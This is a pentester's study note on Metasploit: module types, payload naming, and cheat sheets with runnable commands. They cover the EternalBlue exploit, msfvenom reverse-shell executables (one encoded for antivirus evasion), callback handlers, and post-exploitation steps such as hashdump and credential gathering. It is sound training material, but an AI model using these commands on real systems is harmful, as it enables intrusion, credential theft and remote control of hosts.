```yml
date: 2025-09-10  
author: Sameer Saini  
reason: 0x45
title: Metasploit — Deep Notes (Obsidian-friendly)  
tags: [metasploit, pentest, exploit, notes]
```


## Quick overview

- **Metasploit Framework** = open source toolkit for penetration testing, exploit development, and post-exploitation.
    
- **Metasploit Pro** = commercial product built on top of the framework (extra automation, GUI, reporting).
    
- Major use cases: information gathering, scanning, exploitation, payload generation, post-exploitation, exploit dev.
    

---

## Main components

|Component|Purpose|
|--:|:--|
|`msfconsole`|Primary CLI interface; interactive environment for searching, configuring and running modules.|
|`modules`|Reusable pieces (exploits, auxiliary scanners, post modules, payloads, encoders, nops).|
|`msfvenom`|Payload & shellcode generator + encoder. Replaces old `msfpayload`/`msfencode`.|
|Tools|`pattern_create` / `pattern_offset` (exploit dev helpers), `msfdb` (DB management), `msfconsole` scripting support.|

---

## Jargon & concepts

- **Exploit** — code that leverages a vulnerability to achieve code execution, privilege escalation, etc.
    
- **Vulnerability** — bug/weakness in design, code, or config.
    
- **Payload** — code executed on the target after exploitation (e.g., shell, meterpreter).
    
- **Stager / Stage** — a _stager_ sets up a channel and pulls the larger _stage_ across (staged payloads).
    
- **Single payload** — self-contained payload that does everything in one shot (no second stage).
    
- **Handler** — listener on the attacker side that waits for incoming connections from a payload (e.g. `multi/handler`).
    
- **Post module** — run on a compromised host to gather data, escalate privileges, pivot, or maintain access.
    
- **Encoder / Evasion** — transform payload bytes to avoid detection (may help against signature scanners).
    
- **NOPs** — padding/no-op instructions used in exploit development to align buffers.
    

---

## Module categories (summary + examples)

> [!info] Module categories  
> Use `search` in `msfconsole` to find modules (e.g. `search type:auxiliary smb`).

- **Auxiliary** — scanners, fuzzers, bruteforcers, and other non-exploit helpers.
    
    - Example: `auxiliary/scanner/ssh/ssh_login` (credential brute force).
        
- **Exploit** — modules that attempt to exploit a vulnerability.
    
    - Example: `exploit/windows/smb/ms17_010_eternalblue` (illustrative).
        
- **Payload** — what runs after successful exploit (shells, Meterpreter, file uploaders).
    
    - Example single: `windows/x64/meterpreter_reverse_tcp` (staged vs single variants exist).
        
    - Example staged: `windows/meterpreter/reverse_tcp` (stager → downloads meterpreter stage).
        
- **Post** — run on targets after access.
    
    - Example: `post/windows/gather/enum_logged_on_users`.
        
- **Encoder** — obfuscate payloads (e.g., `x86/shikata_ga_nai`).
    
- **Evasion** — modules/tools to attempt AV avoidance (use with care/ethics).
    
- **NOPs** — e.g. `x86/single_byte` for exploit padding.
    

---

## Naming conventions (how to read payload names)

- `name_with_underscore` → **single/inline** payload (one blob).
    
- `name/with/slash` → **staged** payload (small stager first, stage downloaded later).
    
- e.g. `windows/shell/reverse_tcp` (staged) vs `windows/shell_reverse_tcp` (single).
    

---

## msfconsole — day-to-day workflow & commands

Start:

```bash
msfconsole
```

Basic interactive commands:

```text
help                    # show help and top-level commands
search <term>           # search modules (e.g. search type:exploit smb)
use <module_path>       # select a module (e.g. use exploit/windows/smb/...)
show options            # show configurable options for current module
show payloads           # display compatible payloads
show targets            # show target variants for exploit
set <opt> <value>       # set module option (e.g. set RHOSTS 10.10.10.5)
set PAYLOAD <payload>   # set the payload for the exploit
set LHOST <attacker_ip> # set your listen IP
set LPORT 4444          # set your listen port
setg <opt> <value>      # set global option across modules
unsetg <opt>            # unset a global option
exploit                 # run exploit (use `-j` to background, `-z` for no-session)
run                     # alias for exploit (for some modules)
back                    # unload module (return to msfconsole prompt)
sessions -l             # list sessions
sessions -i <id>        # interact with session id
background              # background the current session
```

> [!note] Backgrounding & handlers  
> If you expect a reverse connection, you can use `exploit -j` or run `use exploit/multi/handler` and `exploit` to handle incoming sessions.

---

## Example — full exploit workflow (typical pattern)

1. **Recon & find target**
    
    - Use scanners: `use auxiliary/scanner/portscan/tcp` or service scanners.
        
2. **Select exploit**
    
    ```text
    use exploit/windows/smb/ms17_010_eternalblue
    show targets
    set RHOSTS 10.10.10.5
    set RPORT 445
    ```
    
3. **Choose payload & handler settings**
    
    ```text
    set PAYLOAD windows/x64/meterpreter_reverse_tcp
    set LHOST 10.0.0.5
    set LPORT 4444
    ```
    
4. **Run exploit**
    
    ```text
    exploit
    ```
    
5. **After successful session**
    
    ```text
    sessions -l
    sessions -i 1
    # now inside Meterpreter
    sysinfo
    getsystem          # attempt privilege escalation (careful & conditional)
    ```
    

---

## msfvenom — create payloads & shellcode

Generate a standalone EXE with a reverse Meterpreter payload:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe
```

Generate raw shellcode (for exploit dev):

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw > shellcode.bin
```

Encode payloads:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe
```

- `-e` = encoder, `-i` = iterations.
    

> [!warning] Encoding is _not_ guaranteed AV-evasion; test and validate. Encoders can break payloads.

---

## Handling sessions & `multi/handler`

When you create a payload that calls back to you, use `multi/handler`:

```text
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
exploit -j
```

`-j` runs handler as a job so msfconsole remains interactive.

---

## Meterpreter — quick cheatsheet

Once you have a Meterpreter session (`sessions -i <id>`):

- `sysinfo` — host info
    
- `getuid` — user context
    
- `ps` — list processes
    
- `migrate <pid>` — move to another process
    
- `upload <local> <remote>` / `download <remote> <local>`
    
- `execute -f cmd.exe -i -t` — spawn a shell
    
- `run post/multi/recon/local_exploit_suggester` — suggest local exploits
    
- `hashdump` — dump SAM/NTHash (requires privileges & proper modules)
    
- `privs` / `getprivs` — list privileges
    

> [!note] Always validate legality and scope before running post modules or dumping credentials.

---

## Post-exploitation modules

Use `post/*` modules to gather data and persist, for example:

- `post/windows/gather/enum_logged_on_users`
    
- `post/windows/gather/credentials`
    
- `post/multi/manage/shell_to_meterpreter` — upgrade basic shell to Meterpreter (if conditions allow)
    

Example:

```text
use post/windows/gather/enum_chrome
set SESSION 1
run
```

---

## Exploit development helpers

- `pattern_create.rb` and `pattern_offset.rb` — create/find offsets for buffer overflow exploit dev.
    
    - Create: `pattern_create -l 2000`
        
    - Find offset: `pattern_offset -q 0x41326341 -l 2000`
        
- `gdb` / `pwndbg` / `radare2` complement exploit dev efforts.
    

---

## Encoders & evasion — short notes

- Encoders transform the byte sequence — e.g., `x86/shikata_ga_nai`.
    
- Evasion modules try to modify payloads or delivery to bypass AV/EDR — use ethically and in scope.
    
- Modern EDRs use behavioural detection; encoding alone often fails.
    

---

## Useful `search` examples

```text
search type:exploit name:smb
search type:auxiliary smb login
search type:post windows gather
```

---

## Best practices & safety

- Use Metasploit only in authorized, legal environments (lab, HTB, CTF, client with signed scope).
    
- Keep a clean lab for testing (isolated network).
    
- When using payloads that create persistence, be careful — you may leave detectable artifacts.
    
- Prefer staged payloads for size constraints; singles for simple one-shot tasks.
    
- Record all commands, timestamps, and evidence for reporting.
    

---

## ASCII packet/flow diagram (simple)

```
[Attacker: msfconsole]  <---setup handler--->  waiting for callback
      |
deliver exploit (phishing / service exploit / file)
      |
[Target] --(exploit triggers)--> runs payload
      |
payload opens connection -> attacker handler (LHOST:LPORT)
      |
Meterpreter session established -> interactive post-exploit
```

---

## Quick examples (cheat-sheet)

1. **Search an exploit**
    

```text
msf6 > search ms17_010
```

2. **Use and configure exploit**
    

```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > show options
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.5
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
msf6 exploit(ms17_010_eternalblue) > set LHOST 10.0.0.5
msf6 exploit(ms17_010_eternalblue) > exploit
```

3. **Generate a payload with msfvenom**
    

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o /tmp/rev.exe
```

4. **Start handler**
    

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.0.5
msf6 exploit(multi/handler) > exploit -j
```

---

